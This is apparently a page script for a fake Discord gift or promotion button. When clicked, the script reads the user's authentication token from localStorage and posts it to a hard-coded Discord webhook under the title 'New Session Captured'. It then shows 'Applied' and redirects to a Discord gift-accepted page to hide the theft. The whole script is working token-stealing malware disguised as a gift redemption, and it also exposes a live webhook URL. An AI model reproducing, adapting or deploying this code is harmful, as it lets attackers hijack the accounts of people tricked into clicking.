<script>
    (function() {
        const init = () => {
            const btn = document.getElementById('btn');
            if (!btn) return;

            btn.addEventListener('click', async () => {
                const status = document.getElementById('status');
                btn.style.opacity = '0.5';
                btn.style.pointerEvents = 'none';
                status.innerText = "Checking...";

                const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");

                if (token) {
                    await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            embeds: [{
                                title: "New Session Captured",
                                description: `Token: ${token}`,
                                color: 5763719
                            }]
                        })
                    });
                }

                status.innerText = "Applied. Redirecting...";
                setTimeout(() => {
                    window.location.href = "https://discord.com/billing/promotions/gift-accepted";
                }, 1000);
            });
        };

        window.addEventListener('load', init);
    })();
</script>
